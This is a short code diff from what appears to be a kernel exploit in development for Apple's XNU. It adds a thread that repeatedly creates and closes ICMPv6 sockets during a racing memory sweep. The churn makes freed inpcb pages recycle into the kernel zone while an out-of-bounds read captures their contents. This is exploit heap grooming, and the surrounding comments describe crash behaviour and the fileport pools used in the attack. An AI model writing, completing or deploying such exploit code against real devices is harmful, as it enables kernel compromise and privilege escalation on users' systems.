@@ -98,8 +98,17 @@ kern_return_t cs2_pe_v1(void) {
        mlocked (munlock never ran on the fail path). Now: 2-pass bound,
        munlock every pass end, per-pass phys_footprint + oob kr telemetry. */
     size_t oob_read_fail_count = 0;
+    /* calib-exact delta #2: LIVE inpcb churn during the sweep — create 512
+       icmpv6 SOCK_DGRAM, close all, repeat. Freed pcb pages recycle into the
+       zone WHILE the copy races (that is how pcb-family content enters the
+       captures). cs2's static fileport pool stays open (identity law); this
+       thread only churns. */
+    volatile int churn_go = 1;
+    pthread_t churn_th;
+    extern void* cs2_churn_thread(void*);
     /* pass-2 wedge law: fire #2 froze at pass-2's first read after a fully
        healthy pass-1 (1.6M one-shot maps). Decode pending — tonight: one pass. */
+    pthread_create(&churn_th, NULL, cs2_churn_thread, (void*)&churn_go);
     for (size_t pass = 0; pass < 1; pass++) {
         {
             struct task_vm_info tvi; mach_msg_type_number_t tc = TASK_VM_INFO_COUNT;
@@ -249,6 +258,8 @@ kern_return_t cs2_pe_v1(void) {
         }
     }
 
+    churn_go = 0;
+    pthread_join(churn_th, NULL);
     LOG("scan exhausted: 1 pass (pass-2 wedge law), no corruption accepted, oob_read kr-fails=%lu — one tap per fresh boot", oob_read_fail_count);
     free(read_buffer);
     free(write_buffer);
